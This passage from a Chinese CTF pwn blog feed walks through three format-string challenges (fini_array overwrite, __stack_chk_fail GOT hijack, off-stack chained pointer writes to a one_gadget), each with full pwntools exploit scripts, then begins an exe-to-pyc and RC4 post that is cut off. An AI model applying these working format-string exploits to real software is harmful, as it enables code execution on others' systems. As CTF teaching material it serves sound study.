href="#1-修改fini-array" class="headerlink" title="(1)修改fini_array"></a>(1)修改fini_array</h3><p><a class="link" href="https://buuoj.cn/challenges#ciscn_2019_sw_1">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="ida速览"><a href="#ida速览" class="headerlink" title="ida速览"></a>ida速览</h4><ul><li>明显的格式化字符串漏洞，但是只有一次利用的机会</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h4><ul><li>只有一次漏洞利用，很明显是不够的，因为修改pirntf_got 为system就需要一次漏洞利用，所以有什么方法可以使得改完printf后再回到main函数呢？其实是有的</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240927141831603.bmp"></p><ul><li>可以发现执行完main函数之后会执行一个终止函数，如果我们可以改终止函数为main函数地址，那是不是就可以又再次回答main函数？答案是肯定的，此题目没有PIE。</li><li>下图第一个红框就是main函数前要执行的初始化函数，而第二个红框就是main函数结束之后要执行的终止函数，我们要改的就是这个函数值</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240927142246469.bmp"></p><h4 id="EXP解释"><a href="#EXP解释" class="headerlink" title="EXP解释"></a>EXP解释</h4><p><font size="4">修改分析：</font></p><ul><li>fini_array -&gt; mainprintf -&gt; system</li><li>很明显要先改高位字节，因为先改小的，再改大的(%x$n的特性，前面有多少个字符了就修改多少)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">printf     = <span class="number">0x0804</span> 989c</span><br><span class="line">system     = <span class="number">0x0804</span> 83D0</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x0804</span> 979C</span><br><span class="line">main       = <span class="number">0x0804</span> <span class="number">8534</span> </span><br></pre></td></tr></table></figure></div><p><font size="4">完整EXP</font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27343)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">printf     = <span class="number">0x0804989c</span></span><br><span class="line">system     = <span class="number">0x080483D0</span></span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x0804979C</span></span><br><span class="line">main       = <span class="number">0x08048534</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移是4</span></span><br><span class="line"><span class="comment"># 改fini_array -&gt; main      printf -&gt; system </span></span><br><span class="line">payload = p32(fini_array+<span class="number">2</span>) + p32(printf+<span class="number">2</span>) + p32(printf) + p32(fini_array)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x804</span>-<span class="number">0x10</span>).encode() + <span class="string">b&#x27;c%4$hn&#x27;</span> + <span class="string">b&#x27;%5$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x83D0</span> - <span class="number">0x804</span>).encode() + <span class="string">b&#x27;c%6$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x8534</span> - <span class="number">0x83D0</span>).encode() + <span class="string">b&#x27;c%7$hn&#x27;</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="2-修改stack-chk-fail"><a href="#2-修改stack-chk-fail" class="headerlink" title="(2)修改stack_chk_fail"></a>(2)修改stack_chk_fail</h3><p>题目来自BaseCTF fmt3,参考了官方题解</p><h4 id="ida速览-1"><a href="#ida速览-1" class="headerlink" title="ida速览"></a>ida速览</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x110</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>很明显的格式化字符串漏洞利用，但是无法栈溢出到返回地址。</li></ul><h4 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h4><ul><li>我们没有system和&#x2F;bin&#x2F;sh，很明显是需要泄露libc的，泄露libc很简单，同开头的64位利用一样，但是然后的步骤我们该如何进行呢？一次格式化字符串漏洞利用行不行呢？</li><li>其实当然是不行的，如何修改可以使得多次利用呢？<font color="red">canary!!!</font></li><li>canary阻止了我们进行栈溢出的利用，但是同时也衍生出了对于它的攻击手法以及利用，**__stack_chk_fail的利用。**</li><li>当输入达到canary的时候，发生错误，系统会执行__stack_chk_fail函数，然后导致退出程序，如果我们修改该函数的got表内容为main函数的地址，那么我们主动去触发这个函数，是不是就会跳到main函数了呢？答案当然是：是的！！！</li><li>所以思路很明显了，先将stack_chk_fail的got改为main函数的地址，并且泄露libc，第二次将printf_got修改为system，第三次传入&#x2F;bin&#x2F;sh就行了，但是记住，要主动去触发__stack_chk_fail函数才会返回到main函数。</li></ul><h4 id="EXP-解释"><a href="#EXP-解释" class="headerlink" title="EXP&amp;解释"></a>EXP&amp;解释</h4><h5 id="1-修改-stack-chk-fail函数got表，并且泄露libc"><a href="#1-修改-stack-chk-fail函数got表，并且泄露libc" class="headerlink" title="1.修改__stack_chk_fail函数got表，并且泄露libc"></a>1.修改__stack_chk_fail函数got表，并且泄露libc</h5><ul><li>根据ida地址分析，只需要进行三次的单字节修改即可。偏移是6，22 &#x3D; 0x10 + 6,0x10的偏移在栈上表示为0x10*8 &#x3D; 0x80，所以对偏移为22的地方进行单字节修改，将偏移为22的地方写入要修改的即可。</li><li>其中的<strong>0x100 - 上次已经写入的字符数 + 本次应该写入的字符数</strong>，个人认为应该是<font color="red">防止出现负数的情况，也算是学到了新的写法了。</font></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">stack_chk_fail = <span class="number">0x0403320</span></span><br><span class="line">main      =      <span class="number">0x040121B</span> </span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1b</span>).encode() + <span class="string">b&#x27;c%22$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span>-<span class="number">0x1b</span>+<span class="number">0x12</span>).encode() + <span class="string">b&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span>-<span class="number">0x12</span>+<span class="number">0x40</span>).encode() + <span class="string">b&#x27;c%24$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;---b%25$s&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) </span><br><span class="line">payload += p64(stack_chk_fail)     <span class="comment"># 22</span></span><br><span class="line">payload += p64(stack_chk_fail+<span class="number">1</span>)   <span class="comment"># 23</span></span><br><span class="line">payload += p64(stack_chk_fail+<span class="number">2</span>)   <span class="comment"># 24</span></span><br><span class="line">payload += p64(printf_got)         <span class="comment"># 25</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 主动触发stack_chk_fail</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;---b&#x27;</span>)</span><br><span class="line">printf_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="string">&quot;printf_address : &quot;</span>+<span class="built_in">hex</span>(printf_addr))</span><br><span class="line">base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure></div><h5 id="2-修改printf-got-system，传入-bin-sh"><a href="#2-修改printf-got-system，传入-bin-sh" class="headerlink" title="2.修改printf_got &#x3D;&gt; system，传入&#x2F;bin&#x2F;sh"></a>2.修改printf_got &#x3D;&gt; system，传入&#x2F;bin&#x2F;sh</h5><ul><li>修改步骤和上述没区别</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(system &amp; <span class="number">0xff</span>).encode() + <span class="string">b&#x27;c%22$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - system&amp;<span class="number">0xff</span>)+(system &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>)).encode() + <span class="string">b&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>))) + (((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>))).encode() + <span class="string">b&quot;c%24$hhn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload += p64(printf_got + <span class="number">1</span>)</span><br><span class="line">payload += p64(printf_got + <span class="number">2</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="非栈上格式化字符串"><a href="#非栈上格式化字符串" class="headerlink" title="非栈上格式化字符串"></a>非栈上格式化字符串</h1><h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><ul><li><font size4>NSSCTF 3rd <strong>ezfmt</strong></font></li></ul><p>先来看看题目：</p><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E9%A2%98%E7%9B%AEida.bmp"></p><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><ul><li>题目很明显，给你7次利用格式化字符串漏洞的机会，让你getshell，可是我们发现<strong>buf是在bss段上面的</strong>，不同于在栈上的利用，在栈上，我们通常是<strong>修改printf_got为system地址</strong>，然后通过传入&#x2F;bin&#x2F;sh,达到getshell的目的，可是此处，我们不可以。</li><li>为什么？因为非栈上的格式化字符串漏洞的利用需要我们自己去手动写payload，不像非栈上有fmtstr_payload这种工具帮我们修改，因此，我们手搓修改就要一直用到格式化字符串漏洞，那么这个printf就无法更改，那我们可以修改什么呢?</li><li><font size="4" color="red"><strong>修改__libc_start_main</strong></font></li><li><strong>__libc_start_main相当于函数的返回地址</strong>，当程序结束的时候会执行它，我们可以将它修改为onegadget，然后就可以getshell了，下面说说如何修改。</li></ul><h4 id="修改核心："><a href="#修改核心：" class="headerlink" title="修改核心："></a>修改核心：</h4><ul><li>非栈上的修改需要我们<fron size="4" color="red"><strong>间接写+无中生友</strong></fron></li></ul><p>我们要找到 <font color="red"><strong>地址a -&gt; 地址b -&gt; 目标地址</strong>，这样的格式。</font></p><p><strong>因为修改a其实是修改c</strong></p><p>举个例子：</p><p><font color="red"> 为了得到A -&gt; B -&gt; C    C不在栈上</font></p><p><font color="red"> 有一个D跟C的地址很像，或许就末两字节不相同</font></p><p><font color="red">借助A -&gt; B -&gt; D 且已知偏移的情况下</font></p><p><font color="red"> 修改A末两字节，就可以使得B-&gt;C。</font></p><h4 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h4><ul><li>先查看栈结构，找到 a-&gt;b-&gt;c的结构，锁定修改的目标：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825183747991.bmp"></p><p>如图，为了修改__libc_start_main，我们选定的结构是下面画框部分，可以发现画框部分的地址，与libc_start_main前面的地址相差不大，我们就成功地找到了”朋友”</p><p><font color="red"> D - &gt; __libc_start_main</font></p><p><font color="red"> A -&gt; B -&gt; C ，修改C为D</font></p><p><font color="red"> A -&gt; B -&gt; D -&gt; __libc_start_main ,再修改B就可以达到修改libc_start_main了</font></p><ul><li>接下来对B而言，刚好也是一个a-&gt;b-&gt;c的结构，<font color="red"><strong>B-&gt;D-&gt;libc_start_main</strong>,如此我们修改B即修改第三个指针libc_start_main为onegadget即可getshell</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825184307134.bmp"></p><h4 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node8.anna.nssctf.cn&quot;,28175)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.31-0ubuntu9.10_amd64.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc基地址和一个stack地址</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%9$p%11$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main= <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] libc_start_main:&quot;</span>,<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_main)</span></span><br><span class="line">base = libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack = &quot;</span>, <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">stack1 = stack - <span class="number">240</span> <span class="comment"># stack1 -&gt; libc_start_main</span></span><br><span class="line">stack2 = stack - <span class="number">224</span> <span class="comment"># stack2 -&gt; stack</span></span><br><span class="line">one = base + <span class="number">0xe3b01</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack1 = &quot;</span>, <span class="built_in">hex</span>(stack1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack2 = &quot;</span>, <span class="built_in">hex</span>(stack2))</span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>) </span><br><span class="line">p.sendline(pay)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">stack1+=<span class="number">2</span></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">stack1+=<span class="number">2</span></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2+<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&gt;&gt;<span class="number">32</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack+<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p>libc版本是泄露libc_start_main后上网站找的：<a class="link" href="https://libc.rip/">libc-database <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exe-&gt;pyc &amp;&amp; RC4 &amp;&amp;pyc反编译</title>
      <link href="/2024/08/22/exe-pyc-RC4/"/>
      <url>/2024/08/22/exe-pyc-RC4/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><p>这篇文章主要介绍ctfre部分，从exe文件转化成pyc文件，顺便提一下rc4加密。</p><p>题目来自basectf,如果选手看到了请务必避开。</p><h1 id="转化"><a href="#转化" class="headerlink" title="转化"></a>转化</h1><h2 id="exe-pyc"><a href="#exe-pyc" class="headerlink" title="exe-&gt;pyc"></a>exe-&gt;pyc</h2><ul><li><p>首先明白为什么要从exe-&gt;pyc，见下图：</p><p><img lazyload src="/images/loading.svg" data-src="/exe-pyc-RC4/exe%E4%BE%8B%E5%AD%90.bmp" alt="exe例子"></p></li></ul><p>我们发现图片虽然是一个exe,但是程序图标是可以发现是一个.py文件，于是我们要去转化成pyc</p><p><strong>介绍一篇文章看看</strong>：<a class="link" href="https://blog.csdn.net/qq_35578171/article/details/138047494?app_version=6.4.5&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22138047494%22,%22source%22:%222302_79260400%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">csdn-blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>觉得麻烦提供一个在线网站：<a class="link" href="https://pyinstxtractor-web.netlify.app/">PyInstaller Extractor WEB (pyinstxtractor-web.netlify.app) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>自己选择exe文件运行就行，会得到一个压缩包，里面会有pyc文件</p><p><img lazyload src="/images/loading.svg" data-src="/exe-pyc-RC4/exe-pyc.bmp"></p><h2 id="pyc-py代码："><a href="#pyc-py代码：" class="headerlink" title="pyc-&gt;py代码："></a>pyc-&gt;py代码：</h2><ul><li><p>先了解什么是pyc：我们所看到的pyc文件，其实是PyCodeObject，是Python编译后的结果。当python程序运行时，编译的结果是保存于PyCodeObject，程序运行结束后，Python就将PyCodeObject写入到pyc文件中，这是个字节码文件。[<a class="link" href="https://blog.csdn.net/weixin_42183408/article/details/88557812">引用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>]</p></li><li><p>在线网站：<a class="link" href="https://www.lddgo.net/string/pyc-compile-decompile">在线Python pyc文件编译与反编译 (lddgo.net) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li></ul><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><ul><li><p>先前得到的pyc转化为py代码，我们可以发现如下的加密脚本：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.9</span></span><br><span class="line"><span class="keyword">import</span> Key</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_Sbox</span>(<span class="params">seed</span>):</span><br><span class="line">    k_b = (<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ <span class="built_in">ord</span>(seed[i % <span class="built_in">len</span>(seed)]) <span class="keyword">for</span> i <span 